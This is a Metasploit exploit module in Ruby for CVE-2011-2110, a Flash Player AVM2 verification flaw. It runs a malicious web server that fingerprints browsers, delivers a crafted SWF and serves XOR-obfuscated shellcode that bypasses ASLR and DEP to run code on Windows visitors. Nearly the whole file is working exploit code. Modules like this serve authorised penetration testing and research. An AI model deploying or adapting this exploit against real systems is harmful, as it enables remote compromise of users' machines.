# $Id$
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GreatRanking
 
    include Msf::Exploit::Remote::HttpServer::HTML
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Adobe Flash Player AVM Verification Logic Array Indexing Code Execution&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a vulnerability in Adobe Flash Player versions 10.3.181.23
                and earlier. This issue is caused by a failure in the ActionScript3 AVM2 verification
                logic. This results in unsafe JIT(Just-In-Time) code being executed. This is the same
                vulnerability that was used for attacks against Korean based organizations.
 
                    Specifically, this issue occurs when indexing an array using an arbitrary value,
                memory can be referenced and later executed. Taking advantage of this issue does not rely
                on heap spraying as the vulnerability can also be used for information leakage.
 
                    Currently this exploit works for IE6, IE7, IE8, Firefox 10.2 and likely several
                other browsers under multiple Windows platforms. This exploit bypasses ASLR/DEP and
                is very reliable.
                },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;mr_me <steventhomasseeley[at]gmail.com>&#039;, # msf exploit,
                    &#039;Unknown&#039;                                  # malware version seen used in targeted attacks
                ],
            &#039;Version&#039;        => &#039;$Revision$&#039;,
            &#039;References&#039;     =>
                [
                    [&#039;CVE&#039;, &#039;2011-2110&#039;],
                    [&#039;OSVDB&#039;, &#039;48268&#039;],
                    [&#039;URL&#039;, &#039;http://www.adobe.com/devnet/swf.html&#039;],
                    [&#039;URL&#039;, &#039;http://www.adobe.com/support/security/bulletins/apsb11-18.html&#039;],
                    [&#039;URL&#039;, &#039;http://www.accessroot.com/arteam/site/download.php?view.331&#039;],
                    [&#039;URL&#039;, &#039;http://www.shadowserver.org/wiki/pmwiki.php/Calendar/20110617&#039;],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039;             => &#039;process&#039;,
                    &#039;HTTP::chunked&#039;        => true,
                    &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;       => 2000,
                    &#039;BadChars&#039;    => "\x00",
                    &#039;DisableNops&#039; => true
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Automatic&#039;, {}],
                ],
            &#039;DisclosureDate&#039; => &#039;Jun 21 2012&#039;,
            &#039;DefaultTarget&#039;  => 0))
    end
 
    def exploit
        # src for the flash file: external/source/exploits/CVE-2011-2110/CVE-2011-2110.as
        # full aslr/dep bypass using the info leak as per malware
        path = File.join( Msf::Config.install_root, "data", "exploits", "CVE-2011-2110.swf" )
        fd = File.open( path, "rb" )
        @swf = fd.read(fd.stat.size)
        fd.close
        super
    end
 
    def check_dependencies
        use_zlib
    end
 
    def get_target(agent)
        #If the user is already specified by the user, we&#039;ll just use that
        return target if target.name != &#039;Automatic&#039;
 
        if agent =~ /MSIE/
            return targets[0]  # ie 6/7/8 tested working
        elsif agent =~ /Firefox/
            return targets[0]  # ff 10.2 tested working
        else
            return nil
        end
    end
 
    def on_request_uri(cli, request)
        agent = request.headers[&#039;User-Agent&#039;]
        my_target = get_target(agent)
 
        # Avoid the attack if the victim doesn&#039;t have the same setup we&#039;re targeting
        if my_target.nil?
            print_error("#{cli.peerhost}:#{cli.peerport} - Browser not supported: #{agent.to_s}")
            send_not_found(cli)
            return
        end
 
        xor_byte  = 122
        trigger   = @swf
        trigger_file = rand_text_alpha(rand(6)+3) + ".swf"
        code = rand_text_alpha(rand(6)+3) + ".txt"
 
        sc = Zlib::Deflate.deflate(payload.encoded)
        shellcode = ""
 
        sc.each_byte do | c |
            shellcode << (xor_byte ^ c)
        end
 
        uri  = ((datastore[&#039;SSL&#039;]) ? "https://" : "http://")
        uri << ((datastore[&#039;SRVHOST&#039;] == &#039;0.0.0.0&#039;) ? Rex::Socket.source_address(&#039;50.50.50.50&#039;) : datastore[&#039;SRVHOST&#039;])
        uri << ":#{datastore[&#039;SRVPORT&#039;]}#{get_resource()}/#{code}"
 
        bd_uri = Zlib::Deflate.deflate(uri)
 
        uri = ""
        bd_uri.each_byte do | c |
            uri << (xor_byte ^ c)
        end
 
        bd_uri = uri.unpack("H*")[0]
 
        obj_id = rand_text_alpha(rand(6)+3)
 
        if request.uri.match(/\.swf/i)
            print_status("Sending malicious swf")
            send_response(cli, trigger, { &#039;Content-Type&#039; => &#039;application/x-shockwave-flash&#039; })
            return
        end
 
        if request.uri.match(/\.txt/i)
            print_status("Sending payload")
            send_response(cli, shellcode, { &#039;Content-Type&#039; => &#039;text/plain&#039; })
            return
        end
 
        html =  <<-EOS
        <html>
        <head>
        </head>
        <body>
        <center>
        <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"
        id="#{obj_id}" width="600" height="400"
        codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab">
        <param name="movie" value="#{get_resource}/#{trigger_file}?info=#{bd_uri}" />
        <embed src="#{get_resource}/#{trigger_file}?info=#{bd_uri}" quality="high"
        width="320" height="300" name="#{obj_id}" align="middle"
        allowNetworking="all"
        type="application/x-shockwave-flash"
        pluginspage="http://www.macromedia.com/go/getflashplayer">
        </embed>
        </object>
        </center>
        </body>
        </html>
        EOS
 
        html = html.gsub(/^\t\t/, &#039;&#039;)
 
        print_status("Sending #{self.name} HTML")
        send_response(cli, html, { &#039;Content-Type&#039; => &#039;text/html&#039; })
    end
end



